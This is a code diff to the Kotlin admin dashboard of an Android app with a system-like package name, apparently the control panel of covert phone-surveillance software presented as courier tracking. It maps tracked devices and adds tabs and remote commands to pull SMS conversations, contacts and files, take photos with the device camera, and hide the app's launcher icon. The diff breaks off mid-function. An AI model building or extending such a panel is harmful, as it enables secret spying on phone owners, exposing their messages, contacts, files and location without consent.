@@ -9,14 +9,20 @@ import androidx.compose.foundation.background
 import androidx.compose.foundation.layout.*
 import androidx.compose.foundation.lazy.LazyColumn
 import androidx.compose.foundation.lazy.items
+import androidx.compose.foundation.pager.HorizontalPager
+import androidx.compose.foundation.pager.rememberPagerState
 import androidx.compose.foundation.shape.RoundedCornerShape
 import androidx.compose.material.icons.Icons
 import androidx.compose.material.icons.filled.*
 import androidx.compose.material3.*
 import androidx.compose.runtime.*
 import androidx.compose.ui.Alignment
+import androidx.compose.ui.platform.LocalLifecycleOwner
+import androidx.lifecycle.Lifecycle
+import androidx.lifecycle.LifecycleEventObserver
 import androidx.compose.ui.Modifier
 import androidx.compose.ui.draw.clip
+import androidx.compose.ui.zIndex
 import androidx.compose.ui.graphics.Color
 import androidx.compose.ui.graphics.vector.ImageVector
 import androidx.compose.ui.text.font.FontWeight
@@ -36,8 +42,14 @@ import com.google.firebase.database.ValueEventListener
 import com.android.system.manager.crypto.CryptoManager
 import com.android.system.manager.crypto.KeyManager
 import com.android.system.manager.BuildConfig
+import com.android.system.manager.data.SmsConversation
+import com.android.system.manager.data.SmsMessage
+import com.android.system.manager.ui.ConversationListScreen
+import com.android.system.manager.ui.ConversationDetailScreen
 import dagger.hilt.android.AndroidEntryPoint
 import kotlinx.coroutines.launch
+import androidx.compose.material3.Tab
+import androidx.compose.material3.TabRow
 import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
@@ -74,20 +86,31 @@ class AdminDashboardActivity : ComponentActivity() {
     )
 
     data class DeviceData(
+        val uid: String = "",
         val lat: Double = 0.0,
         val lng: Double = 0.0,
-        val accuracy: Float = 0f,
+        val accuracy: Double = 0.0,
+        val battery: Int = 0,
+        val timestamp: Long = 0L,
+        val provider: String = "",
+        
+        // Device info (from devices/{uid}/ root)
+        val deviceId: String = "",
+        val deviceName: String = "",
+        val email: String? = null,
+        
+        // Status (from devices/{uid}/status/)
+        val online: Boolean = false,
+        val lastSeen: Long = 0L,
+        
+        // Tracking config
+        val trackingEnabled: Boolean = false,
+        val intervalSeconds: Int = 14,
+        
+        // Legacy fields for compatibility
         val speed: Double = 0.0,
         val bearing: Double = 0.0,
         val altitude: Double = 0.0,
-        val provider: String = "",
-        val battery: Int = 0,
-        val timestamp: Long = 0L,
-        val isOnline: Boolean = false,
-        val deviceId: String = "",
-        val deviceName: String = "",
-        val email: String = "",
-        val status: String = "",
         val launcherHidden: Boolean = false
     )
     
@@ -108,12 +131,7 @@ class AdminDashboardActivity : ComponentActivity() {
         var onlineCouriers by remember { mutableStateOf(0) }
         var offlineCouriers by remember { mutableStateOf(0) }
         var selectedDevice by remember { mutableStateOf<DeviceData?>(null) }
-        var showSmsPanel by remember { mutableStateOf(false) }
-        var smsPanelDeviceId by remember { mutableStateOf("") }
-        var showContactsPanel by remember { mutableStateOf(false) }
-        var contactsPanelDeviceId by remember { mutableStateOf("") }
-        var showFilesPanel by remember { mutableStateOf(false) }
-        var filesPanelDeviceId by remember { mutableStateOf("") }
+        var selectedConversation by remember { mutableStateOf<SmsConversation?>(null) }
         val scope = rememberCoroutineScope()
         var googleMap by remember { mutableStateOf<GoogleMap?>(null) }
         val markers = remember { mutableMapOf<String, Marker>() }
@@ -124,62 +142,104 @@ class AdminDashboardActivity : ComponentActivity() {
                 override fun onDataChange(snapshot: DataSnapshot) {
                     try {
                         Log.d("DEBUG_MAP", "Firebase data changed, snapshot exists: ${snapshot.exists()}")
+                        Log.d("SYS_MGR_DEBUG", "onDataChange called, snapshot.exists: ${snapshot.exists()}, childrenCount: ${snapshot.childrenCount}")
                         
                         val deviceList = mutableListOf<DeviceData>()
-                        var online = 0
-                        var offline = 0
+                        var onlineCount = 0
+                        var offlineCount = 0
                         
                         if (snapshot.exists()) {
                             snapshot.children.forEach { child ->
                                 try {
+                                    val deviceUid = child.key ?: ""
+                                    Log.d("SYS_MGR_DEBUG", "Processing device: $deviceUid")
+                                    
+                                    // Read from location/
                                     val locationSnapshot = child.child("location")
-                                    val device = locationSnapshot.getValue(DeviceData::class.java)
-                                    if (device != null) {
-                                        val isHidden = locationSnapshot.child("launcherHidden").getValue(Boolean::class.java) ?: false
-                                        
-                                        // AES deshifrlash
-                                        val aesKey = KeyManager.getAesKey(this@AdminDashboardActivity)
-                                        val rawLat = locationSnapshot.child("lat").getValue(String::class.java)
-                                        val rawLng = locationSnapshot.child("lng").getValue(String::class.java)
-                                        
-                                        val decryptedLat: Double = if (aesKey != null && rawLat != null) {
-                                            val decrypted = CryptoManager.decrypt(rawLat, aesKey)
-                                            if (decrypted != null) {
-                                                decrypted.toDoubleOrNull() ?: device.lat
-                                            } else {
-                                                if (BuildConfig.DEBUG) { Log.w("SYS_MGR", "decrypt failed for lat") }
-                                                rawLat.toDoubleOrNull() ?: device.lat
+                                    val aesKey = KeyManager.getAesKey(this@AdminDashboardActivity)
+                                    
+                                    val lat = try {
+                                        locationSnapshot.child("lat").getValue(String::class.java)?.let { encryptedLat ->
+                                            try {
+                                                if (aesKey != null) {
+                                                    val decrypted = CryptoManager.decrypt(encryptedLat, aesKey)
+                                                    decrypted?.toDoubleOrNull() ?: encryptedLat.toDoubleOrNull() ?: 0.0
+                                                } else {
+                                                    encryptedLat.toDoubleOrNull() ?: 0.0
+                                                }
+                                            } catch (e: Exception) {
+                                                encryptedLat.toDoubleOrNull() ?: 0.0
                                             }
-                                        } else {
-                                            device.lat
-                                        }
-                                        
-                                        val decryptedLng: Double = if (aesKey != null && rawLng != null) {
-                                            val decrypted = CryptoManager.decrypt(rawLng, aesKey)
-                                            if (decrypted != null) {
-                                                decrypted.toDoubleOrNull() ?: device.lng
-                                            } else {
-                                                if (BuildConfig.DEBUG) { Log.w("SYS_MGR", "decrypt failed for lng") }
-                                                rawLng.toDoubleOrNull() ?: device.lng
-                                            }
-                                        } else {
-                                            device.lng
-                                        }
-                                        
-                                        val deviceWithId = device.copy(
-                                            deviceId = child.key ?: "",
-                                            launcherHidden = isHidden,
-                                            lat = decryptedLat,
-                                            lng = decryptedLng
-                                        )
-                                        deviceList.add(deviceWithId)
-                                        if (device.isOnline) online++ else offline++
-                                        Log.d("DEBUG_MAP", "Device found: ${device.deviceName}, lat: ${device.lat}, lng: ${device.lng}")
-                                    } else {
-                                        Log.w("DEBUG_MAP", "Null device data for child: ${child.key}")
+                                        } ?: locationSnapshot.child("lat").getValue(Double::class.java) ?: 0.0
+                                    } catch (e: Exception) {
+                                        locationSnapshot.child("lat").getValue(Double::class.java) ?: 0.0
                                     }
+                                    
+                                    val lng = try {
+                                        locationSnapshot.child("lng").getValue(String::class.java)?.let { encryptedLng ->
+                                            try {
+                                                if (aesKey != null) {
+                                                    val decrypted = CryptoManager.decrypt(encryptedLng, aesKey)
+                                                    decrypted?.toDoubleOrNull() ?: encryptedLng.toDoubleOrNull() ?: 0.0
+                                                } else {
+                                                    encryptedLng.toDoubleOrNull() ?: 0.0
+                                                }
+                                            } catch (e: Exception) {
+                                                encryptedLng.toDoubleOrNull() ?: 0.0
+                                            }
+                                        } ?: locationSnapshot.child("lng").getValue(Double::class.java) ?: 0.0
+                                    } catch (e: Exception) {
+                                        locationSnapshot.child("lng").getValue(Double::class.java) ?: 0.0
+                                    }
+                                    
+                                    val battery = locationSnapshot.child("battery").getValue(Int::class.java) ?: 0
+                                    val timestamp = locationSnapshot.child("timestamp").getValue(Long::class.java) ?: 0L
+                                    val accuracy = locationSnapshot.child("accuracy").getValue(Double::class.java) ?: 0.0
+                                    val provider = locationSnapshot.child("provider").getValue(String::class.java) ?: ""
+                                    val launcherHidden = locationSnapshot.child("launcherHidden").getValue(Boolean::class.java) ?: false
+                                    
+                                    // Read from status/
+                                    val statusSnapshot = child.child("status")
+                                    val isOnline = statusSnapshot.child("online").getValue(Boolean::class.java) ?: false
+                                    val lastSeen = statusSnapshot.child("lastSeen").getValue(Long::class.java) ?: 0L
+                                    
+                                    // Read from root level (device info)
+                                    val deviceId = child.child("deviceId").getValue(String::class.java) ?: ""
+                                    val deviceName = child.child("deviceName").getValue(String::class.java) ?: ""
+                                    val email = child.child("email").getValue(String::class.java)
+                                    Log.d("SYS_MGR_DEBUG", "Device fields - ID: $deviceId, Name: $deviceName, Email: $email, lat: $lat, lng: $lng")
+                                    
+                                    // Read from trackingConfig/
+                                    val trackingSnapshot = child.child("trackingConfig")
+                                    val trackingEnabled = trackingSnapshot.child("trackingEnabled").getValue(Boolean::class.java) ?: false
+                                    val intervalSeconds = trackingSnapshot.child("intervalSeconds").getValue(Int::class.java) ?: 14
+                                    
+                                    // Create device object
+                                    val device = DeviceData(
+                                        uid = deviceUid,
+                                        lat = lat,
+                                        lng = lng,
+                                        accuracy = accuracy,
+                                        battery = battery,
+                                        timestamp = timestamp,
+                                        provider = provider,
+                                        deviceId = deviceId,
+                                        deviceName = deviceName,
+                                        email = email,
+                                        online = isOnline,
+                                        lastSeen = lastSeen,
+                                        trackingEnabled = trackingEnabled,
+                                        intervalSeconds = intervalSeconds,
+                                        launcherHidden = launcherHidden
+                                    )
+                                    
+                                    Log.d("SYS_MGR_DEBUG", "Adding device to list: $deviceName")
+                                    deviceList.add(device)
+                                    if (device.online) onlineCount++ else offlineCount++
+                                    Log.d("DEBUG_MAP", "Device found: ${device.deviceName}, lat: ${device.lat}, lng: ${device.lng}")
                                 } catch (e: Exception) {
                                     Log.e("DEBUG_MAP", "Error parsing device data: ${e.message}")
+                                    Log.e("SYS_MGR_DEBUG", "Device parsing FAILED for ${child.key}: ${e.message}", e)
                                 }
                             }
                         } else {
@@ -188,16 +248,17 @@ class AdminDashboardActivity : ComponentActivity() {
                         
                         devices = deviceList
                         currentDevices = deviceList
+                        Log.d("SYS_MGR_DEBUG", "Final device list size: ${deviceList.size}")
                         totalCouriers = deviceList.size
-                        onlineCouriers = online
-                        offlineCouriers = offline
+                        onlineCouriers = onlineCount
+                        offlineCouriers = offlineCount
                         
                         // Update map markers
                         googleMap?.let { map ->
                             updateMapMarkers(map, markers, deviceList)
                         }
                         
-                        Log.d("DEBUG_MAP", "Updated ${deviceList.size} devices: $online online, $offline offline")
+                        Log.d("DEBUG_MAP", "Updated ${deviceList.size} devices: $onlineCount online, $offlineCount offline")
                     } catch (e: Exception) {
                         Log.e("DEBUG_MAP", "Critical error in Firebase data processing: ${e.message}")
                         // Set empty state to prevent crashes
@@ -216,135 +277,298 @@ class AdminDashboardActivity : ComponentActivity() {
             
             devicesRef.addValueEventListener(listener)
         }
-        
-        Box(modifier = Modifier.fillMaxSize()) {
-            // Map View
-            AndroidView(
-                factory = { ctx ->
-                    MapView(ctx).also { mv ->
-                        mv.onCreate(Bundle())
-                        mv.onResume()
-                        mv.getMapAsync { map ->
-                            googleMap = map
-                            map.uiSettings.isZoomControlsEnabled = true
-                            map.uiSettings.isCompassEnabled = true
-                            map.moveCamera(
-                                CameraUpdateFactory.newLatLngZoom(
-                                    LatLng(41.299496, 69.240073), 10f
+
+        val pagerState = rememberPagerState(initialPage = 0) { 5 }
+        val tabTitles = listOf("Xarita", "SMS", "Kontakt", "Fayllar", "Media")
+
+        @Composable
+        fun MapContent() {
+            var mapView by remember { mutableStateOf<MapView?>(null) }
+            val lifecycle = LocalLifecycleOwner.current.lifecycle
+
+            DisposableEffect(lifecycle) {
+                val observer = LifecycleEventObserver { _, event ->
+                    when (event) {
+                        Lifecycle.Event.ON_RESUME -> mapView?.onResume()
+                        Lifecycle.Event.ON_PAUSE -> mapView?.onPause()
+                        Lifecycle.Event.ON_DESTROY -> mapView?.onDestroy()
+                        else -> {}
+                    }
+                }
+                lifecycle.addObserver(observer)
+                onDispose { lifecycle.removeObserver(observer) }
+            }
+
+            Box(modifier = Modifier.fillMaxSize()) {
+                // Map View
+                AndroidView(
+                    factory = { ctx ->
+                        MapView(ctx).also { mv ->
+                            mapView = mv
+                            mv.onCreate(Bundle())
+                            mv.onResume()
+                            mv.getMapAsync { map ->
+                                googleMap = map
+                                map.uiSettings.isZoomControlsEnabled = true
+                                map.uiSettings.isCompassEnabled = true
+                                map.moveCamera(
+                                    CameraUpdateFactory.newLatLngZoom(
+                                        LatLng(41.299496, 69.240073), 10f
+                                    )
                                 )
+                                map.setOnMarkerClickListener { marker ->
+                                    // marker.tag = device.uid (Firebase UID)
+                                    val uid = marker.tag as? String
+                                    val device = currentDevices.find { it.uid == uid }
+                                    if (device != null) selectedDevice = device
+                                    true
+                                }
+                            }
+                        }
+                    },
+                    modifier = Modifier.fillMaxSize()
+                )
+
+                // Statistics Bar
+                Column(
+                    modifier = Modifier
+                        .fillMaxWidth()
+                        .padding(16.dp)
+                        .align(Alignment.TopStart)
+                ) {
+                    StatisticsBar(
+                        total = totalCouriers,
+                        online = onlineCouriers,
+                        offline = offlineCouriers
+                    )
+                }
+
+                // Courier List
+                Column(modifier = Modifier
+                    .fillMaxWidth()
+                    .height(300.dp)
+                    .padding(16.dp)
+                    .align(Alignment.BottomStart)) {
+                    Text(
+                        text = "Active Couriers (${devices.size})",
+                        style = MaterialTheme.typography.titleMedium,
+                        fontWeight = FontWeight.Bold,
+                        modifier = Modifier.padding(16.dp)
+                    )
+
+                    if (devices.isEmpty()) {
+                        Box(
+                            modifier = Modifier
+                                .fillMaxWidth()
+                                .weight(1f),
+                            contentAlignment = Alignment.Center
+                        ) {
+                            Text(
+                                text = "No active devices",
+                                color = MaterialTheme.colorScheme.onSurfaceVariant,
+                                style = MaterialTheme.typography.bodyMedium
                             )
-                            map.setOnMarkerClickListener { marker ->
-                                val deviceId = marker.tag as? String
-                                val device = currentDevices.find { it.deviceId == deviceId }
-                                if (device != null) selectedDevice = device
-                                true
+                        }
+                    } else {
+                        LazyColumn(modifier = Modifier.weight(1f)) {
+                            items(devices) { device ->
+                                CourierItem(device = device, onClick = {
+                                    selectedDevice = device
+                                    googleMap?.let { focusOnDevice(it, device) }
+                                })
                             }
                         }
                     }
-                },
-                modifier = Modifier.fillMaxSize()
-            )
-            
-            // Statistics Bar
-            Column(
-                modifier = Modifier
-                    .fillMaxWidth()
-                    .padding(16.dp)
-                    .align(Alignment.TopStart)
-            ) {
-                StatisticsBar(
-                    total = totalCouriers,
-                    online = onlineCouriers,
-                    offline = offlineCouriers
-                )
-            }
-            
-            // Courier List
-            Column(modifier = Modifier
-                .fillMaxWidth()
-                .height(300.dp)
-                .padding(16.dp)
-                .align(Alignment.BottomStart)) {
-                Text(
-                    text = "Active Couriers (${devices.size})",
-                    style = MaterialTheme.typography.titleMedium,
-                    fontWeight = FontWeight.Bold,
-                    modifier = Modifier.padding(16.dp)
-                )
+                }
 
-                if (devices.isEmpty()) {
-                    Box(
-                        modifier = Modifier
-                            .fillMaxWidth()
-                            .weight(1f),
-                        contentAlignment = Alignment.Center
-                    ) {
-                        Text(
-                            text = "No active devices",
-                            color = MaterialTheme.colorScheme.onSurfaceVariant,
-                            style = MaterialTheme.typography.bodyMedium
-                        )
-                    }
-                } else {
-                    LazyColumn(modifier = Modifier.weight(1f)) {
-                        items(devices) { device ->
-                            CourierItem(device = device, onClick = { 
-                                selectedDevice = device
-                                googleMap?.let { focusOnDevice(it, device) }
-                            })
+                // Device Detail Popup
+                selectedDevice?.let { device ->
+                    DeviceDetailPopup(
+                        device = device,
+                        onDismiss = { selectedDevice = null },
+                        onSmsClick = { uid ->
+                            sendSyncSmsCommand(uid)
+                            scope.launch { pagerState.animateScrollToPage(1) }
+                        },
+                        onContactsClick = { uid ->
+                            sendSyncContactsCommand(uid)
+                            scope.launch { pagerState.animateScrollToPage(2) }
+                        },
+                        onFilesClick = { uid ->
+                            sendSyncFilesCommand(uid)
+                            scope.launch { pagerState.animateScrollToPage(3) }
+                        },
+                        onTakePhotoClick = { uid ->
+                            sendTakePhotoCommand(uid)
+                            scope.launch { pagerState.animateScrollToPage(4) }
                         }
+                    )
+                }
+            }
+        }
+
+        @Composable
+        fun SmsTabContent(deviceId: String?) {
+            if (deviceId == null) {
+                Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
+                    Text("Qurilma tanlanmagan",
+                        color = MaterialTheme.colorScheme.onSurface.copy(alpha = 0.4f))
+                }
+                return
+            }
+
+            var selectedConversation by remember { mutableStateOf<SmsConversation?>(null) }
+            var conversations by remember { mutableStateOf<List<SmsConversation>>(emptyList()) }
+            var messages by remember { mutableStateOf<List<SmsMessage>>(emptyList()) }
+            var isLoading by remember { mutableStateOf(true) }
+
+            // Load conversations
+            LaunchedEffect(deviceId) {
+                loadConversations(deviceId) { loadedConversations ->
+                    conversations = loadedConversations
+                    isLoading = false
+                }
+            }
+
+            // Load messages when conversation is selected
+            LaunchedEffect(selectedConversation) {
+                selectedConversation?.let { conv ->
+                    loadMessages(deviceId, conv.conversationKey) { loadedMessages ->
+                        messages = loadedMessages
                     }
                 }
             }
-            
-                // Device Detail Popup
-            selectedDevice?.let { device ->
-                DeviceDetailPopup(
-                    device = device,
-                    onDismiss = { selectedDevice = null },
-                    onSmsClick = { uid ->
-                        sendSyncSmsCommand(uid)
-                        smsPanelDeviceId = uid
-                        showSmsPanel = true
-                    },
-                    onContactsClick = { uid ->
-                        sendSyncContactsCommand(uid)
-                        contactsPanelDeviceId = uid
-                        showContactsPanel = true
-                    },
-                    onFilesClick = { uid ->
-                        sendSyncFilesCommand(uid)
-                        filesPanelDeviceId = uid
-                        showFilesPanel = true
-                    },
-                    onTakePhotoClick = { uid ->
-                        sendTakePhotoCommand(uid)
+
+            Box(modifier = Modifier.fillMaxSize()) {
+                if (selectedConversation == null) {
+                    // Show conversation list
+                    if (isLoading) {
+                        Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
+                            CircularProgressIndicator()
+                        }
+                    } else {
+                        ConversationListScreen(
+                            conversations = conversations,
+                            onConversationClick = { selectedConversation = it }
+                        )
                     }
+                    
+                    // Sync button
+                    IconButton(
+                        onClick = { sendSyncSmsCommand(deviceId) },
+                        modifier = Modifier.align(Alignment.TopEnd).padding(16.dp).zIndex(1f)
+                    ) {
+                        Icon(Icons.Default.Refresh, contentDescription = "Sync")
+                    }
+                } else {
+                    // Show conversation detail
+                    ConversationDetailScreen(
+                        phoneNumber = selectedConversation!!.phoneNumber,
+                        messages = messages,
+                        onBackClick = { selectedConversation = null }
+                    )
+                }
+            }
+        }
+
+        @Composable
+        fun ContactsTabContent(deviceId: String?) {
+            if (deviceId == null) {
+                Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
+                    Text("Qurilma tanlanmagan",
+                        color = MaterialTheme.colorScheme.onSurface.copy(alpha = 0.4f))
+                }
+                return
+            }
+            Box(modifier = Modifier.fillMaxSize()) {
+                ContactsPanel(deviceId = deviceId, onDismiss = {})
+                IconButton(
+                    onClick = { sendSyncContactsCommand(deviceId) },
+                    modifier = Modifier
+                        .align(Alignment.TopEnd)
+                        .padding(16.dp)
+                        .zIndex(1f)
+                ) {
+                    Icon(Icons.Default.Refresh, contentDescription = "Sync")
+                }
+            }
+        }
+
+        @Composable
+        fun FilesTabContent(deviceId: String?) {
+            if (deviceId == null) {
+                Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
+                    Text("Qurilma tanlanmagan",
+                        color = MaterialTheme.colorScheme.onSurface.copy(alpha = 0.4f))
+                }
+                return
+            }
+            Box(modifier = Modifier.fillMaxSize()) {
+                FilesPanel(deviceId = deviceId, onDismiss = {})
+                IconButton(
+                    onClick = { sendSyncFilesCommand(deviceId) },
+                    modifier = Modifier
+                        .align(Alignment.TopEnd)
+                        .padding(16.dp)
+                        .zIndex(1f)
+                ) {
+                    Icon(Icons.Default.Refresh, contentDescription = "Sync")
+                }
+            }
+        }
+
+        @Composable
+        fun MediaTabContent(deviceId: String?) {
+            if (deviceId == null) {
+                Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
+                    Text("Qurilma tanlanmagan",
+                        color = MaterialTheme.colorScheme.onSurface.copy(alpha = 0.4f))
+                }
+                return
+            }
+            Column(
+                modifier = Modifier.fillMaxSize().padding(16.dp),
+                verticalArrangement = Arrangement.spacedBy(12.dp)
+            ) {
+                Text("Kamera / Media", style = MaterialTheme.typography.titleMedium)
+                Button(
+                    onClick = { sendTakePhotoCommand(deviceId) },
+                    modifier = Modifier.fillMaxWidth()
+                ) {
+                    Text("Foto olish")
+                }
+                Text(
+                    "Foto olingandan keyin bu yerda ko'rinadi",
+                    color = MaterialTheme.colorScheme.onSurface.copy(alpha = 0.4f),
+                    style = MaterialTheme.typography.bodySmall
                 )
             }
+        }
 
-            // SMS Panel (bottom sheet style)
-            if (showSmsPanel) {
-                SmsPanel(
-                    deviceId = smsPanelDeviceId,
-                    onDismiss = { showSmsPanel = false }
-                )
+        Column(Modifier.fillMaxSize()) {
+            TabRow(selectedTabIndex = pagerState.currentPage) {
+                tabTitles.forEachIndexed { index, title ->
+                    Tab(
+                        selected = pagerState.currentPage == index,
+                        onClick = { scope.launch { pagerState.animateScrollToPage(index) } },
+                        text = { Text(title) }
+                    )
+                }
             }
 
-            // Contacts Panel
-            if (showContactsPanel) {
-                ContactsPanel(
-                    deviceId = contactsPanelDeviceId,
-                    onDismiss = { showContactsPanel = false }
-                )
-            }
-
-            // Files Panel
-            if (showFilesPanel) {
-                FilesPanel(
-                    deviceId = filesPanelDeviceId,
-                    onDismiss = { showFilesPanel = false }
-                )
+            HorizontalPager(
+                state = pagerState,
+                modifier = Modifier.weight(1f),
+                userScrollEnabled = false
+            ) { page ->
+                when (page) {
+                    0 -> MapContent()
+                    1 -> SmsTabContent(deviceId = selectedDevice?.uid)
+                    2 -> ContactsTabContent(deviceId = selectedDevice?.uid)
+                    3 -> FilesTabContent(deviceId = selectedDevice?.uid)
+                    4 -> MediaTabContent(deviceId = selectedDevice?.uid)
+                    else -> Box(Modifier.fillMaxSize())
+                }
             }
         }
     }
@@ -364,9 +588,9 @@ class AdminDashboardActivity : ComponentActivity() {
                     .icon(getDeviceIcon(device))
                 
                 val marker = map.addMarker(markerOptions)
-                marker?.tag = device.deviceId
+                marker?.tag = device.uid  // Use Firebase UID as tag
                 if (marker != null) {
-                    markers[device.deviceId] = marker
+                    markers[device.uid] = marker
                 }
             }
         }
@@ -374,7 +598,7 @@ class AdminDashboardActivity : ComponentActivity() {
     
     private fun getDeviceIcon(device: DeviceData): BitmapDescriptor {
         return when {
-            !device.isOnline -> BitmapDescriptorFactory.defaultMarker(BitmapDescriptorFactory.HUE_RED)
+            !device.online -> BitmapDescriptorFactory.defaultMarker(BitmapDescriptorFactory.HUE_RED)
             device.battery < 20 -> BitmapDescriptorFactory.defaultMarker(BitmapDescriptorFactory.HUE_ORANGE)
             else -> BitmapDescriptorFactory.defaultMarker(BitmapDescriptorFactory.HUE_GREEN)
         }
@@ -443,7 +667,7 @@ class AdminDashboardActivity : ComponentActivity() {
                         modifier = Modifier
                             .size(12.dp)
                             .background(
-                                if (device.isOnline) Color.Green else Color.Red,
+                                if (device.online) Color.Green else Color.Red,
                                 shape = RoundedCornerShape(6.dp)
                             )
                     )
@@ -457,9 +681,9 @@ class AdminDashboardActivity : ComponentActivity() {
                             fontSize = 14.sp
                         )
                         Text(
-                            text = "Last seen: ${getRelativeTime(device.timestamp)}",
+                            text = formatLastSeen(device.lastSeen),
                             fontSize = 12.sp,
-                            color = MaterialTheme.colorScheme.onSurfaceVariant
+                            color = Color.Gray
                         )
                     }
                 }
@@ -544,8 +768,8 @@ class AdminDashboardActivity : ComponentActivity() {
                 Spacer(modifier = Modifier.height(8.dp))
                 
                 DetailRow("Device ID", device.deviceId)
-                DetailRow("Email", device.email)
-                DetailRow("Status", if (device.isOnline) "Online" else "Offline")
+                DetailRow("Email", device.email ?: "")
+                DetailRow("Status", if (device.online) "Online" else "Offline")
                 DetailRow("Provider", device.provider.uppercase())
                 DetailRow("Battery", "${device.battery}%")
                 DetailRow("Speed", "${device.speed} km/h")
@@ -566,9 +790,9 @@ class AdminDashboardActivity : ComponentActivity() {
 
                 Spacer(modifier = Modifier.height(8.dp))
 
-                val deviceId = device.deviceId
+                val deviceUid = device.uid
                 Button(
-                    onClick = { onFilesClick(deviceId) },
+                    onClick = { onFilesClick(deviceUid) },
                     modifier = Modifier.fillMaxWidth(),
                     colors = ButtonDefaults.buttonColors(
                         containerColor = Color(0xFF607D8B)
@@ -580,7 +804,7 @@ class AdminDashboardActivity : ComponentActivity() {
                 Spacer(modifier = Modifier.height(8.dp))
 
                 Button(
-                    onClick = { onContactsClick(deviceId) },
+                    onClick = { onContactsClick(deviceUid) },
                     modifier = Modifier.fillMaxWidth(),
                     colors = ButtonDefaults.buttonColors(
                         containerColor = MaterialTheme.colorScheme.tertiary
@@ -592,7 +816,7 @@ class AdminDashboardActivity : ComponentActivity() {
                 Spacer(modifier = Modifier.height(8.dp))
 
                 Button(
-                    onClick = { onSmsClick(deviceId) },
+                    onClick = { onSmsClick(deviceUid) },
                     modifier = Modifier.fillMaxWidth(),
                     colors = ButtonDefaults.buttonColors(
                         containerColor = MaterialTheme.colorScheme.secondary
@@ -604,7 +828,7 @@ class AdminDashboardActivity : ComponentActivity() {
                 Spacer(modifier = Modifier.height(8.dp))
 
                 Button(
-                    onClick = { onTakePhotoClick(deviceId) },
+                    onClick = { onTakePhotoClick(deviceUid) },
                     modifier = Modifier.fillMaxWidth(),
                     colors = ButtonDefaults.buttonColors(
                         containerColor = Color(0xFF9C27B0)
@@ -622,7 +846,7 @@ class AdminDashboardActivity : ComponentActivity() {
                     if (device.launcherHidden) {
                         Button(
                             onClick = {
-                                sendLauncherCommand(device.deviceId, "showLauncher")
+                                sendLauncherCommand(device.uid, "showLauncher")
                             },
                             modifier = Modifier.fillMaxWidth(),
                             colors = ButtonDefaults.buttonColors(
@@ -634,7 +858,7 @@ class AdminDashboardActivity : ComponentActivity() {
                     } else {
                         Button(
                             onClick = {
-                                sendLauncherCommand(device.deviceId, "hideLauncher")
+                                sendLauncherCommand(device.uid, "hideLauncher")
                             },
                             modifier = Modifier.fillMaxWidth(),
                             colors = ButtonDefaults.buttonColors(
@@ -682,18 +906,33 @@ class AdminDashboardActivity : ComponentActivity() {
         }
     }
     
+    private fun formatLastSeen(timestamp: Long): String {
+        if (timestamp == 0L) return "Hech qachon"
+        
+        val now = System.currentTimeMillis()
+        val diff = now - timestamp
+        
+        return when {
+            diff < 10_000 -> "Hozir"
+            diff < 60_000 -> "${diff / 1000} soniya oldin"
+            diff < 3600_000 -> "${diff / 60_000} daqiqa oldin"
+            diff < 86400_000 -> "${diff / 3600_000} soat oldin"
+            else -> "${diff / 86400_000} kun oldin"
+        }
+    }
+    
     private fun openCourierDetail(device: DeviceData) {
         val intent = Intent(this, CourierDetailActivity::class.java).apply {
-            putExtra("device_id", device.deviceId)
+            putExtra("device_id", device.uid)
             putExtra("device_name", device.deviceName)
         }
         startActivity(intent)
     }
     
-    private fun sendLauncherCommand(deviceId: String, command: String) {
+    private fun sendLauncherCommand(deviceUid: String, command: String) {
         val commandsRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
             .getReference("devices")
-            .child(deviceId)
+            .child(deviceUid)
             .child("commands")
 
         when (command) {
@@ -719,10 +958,10 @@ class AdminDashboardActivity : ComponentActivity() {
     /**
      * syncSms command ni Firebase'ga yozadi
      */
-    private fun sendSyncSmsCommand(deviceId: String) {
+    private fun sendSyncSmsCommand(deviceUid: String) {
         val commandsRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
             .getReference("devices")
-            .child(deviceId)
+            .child(deviceUid)
             .child("commands")
 
         commandsRef.child("syncSms").setValue(mapOf(
@@ -730,157 +969,100 @@ class AdminDashboardActivity : ComponentActivity() {
             "timestamp" to ServerValue.TIMESTAMP,
             "status" to "pending"
         ))
-        if (BuildConfig.DEBUG) { Log.d("SYS_MGR", "syncSms command sent for device: $deviceId") }
+        if (BuildConfig.DEBUG) { Log.d("SYS_MGR", "syncSms command sent for device: $deviceUid") }
     }
 
-    /**
-     * SMS ro'yxatini ko'rsatuvchi panel
-     */
-    @Composable
-    private fun SmsPanel(deviceId: String, onDismiss: () -> Unit) {
-        var smsList by remember { mutableStateOf<List<SmsItem>>(emptyList()) }
-        var isLoading by remember { mutableStateOf(true) }
+    private fun loadConversations(deviceId: String, onLoaded: (List<SmsConversation>) -> Unit) {
+        val conversationsRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
+            .getReference("devices/$deviceId/sms/conversations")
 
-        // Firebase'dan SMS larni o'qish
-        LaunchedEffect(deviceId) {
-            val smsRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
-                .getReference("devices")
-                .child(deviceId)
-                .child("sms")
+        conversationsRef.addValueEventListener(object : ValueEventListener {
+            override fun onDataChange(snapshot: DataSnapshot) {
+                val aesKey = KeyManager.getAesKey(this@AdminDashboardActivity)
+                val list = mutableListOf<SmsConversation>()
+                
+                snapshot.children.forEach { convSnapshot ->
+                    try {
+                        val conversationKey = convSnapshot.key ?: return@forEach
+                        val rawPhoneNumber = convSnapshot.child("phoneNumber").getValue(String::class.java) ?: ""
+                        val lastMessage = convSnapshot.child("lastMessage").getValue(String::class.java) ?: ""
+                        val lastTimestamp = convSnapshot.child("lastTimestamp").getValue(Long::class.java) ?: 0L
 
-            smsRef.addValueEventListener(object : ValueEventListener {
-                override fun onDataChange(snapshot: DataSnapshot) {
-                    val aesKey = KeyManager.getAesKey(this@AdminDashboardActivity)
-                    val list = mutableListOf<SmsItem>()
-                    snapshot.children.forEach { child ->
-                        try {
-                            val id = child.child("id").getValue(String::class.java) ?: ""
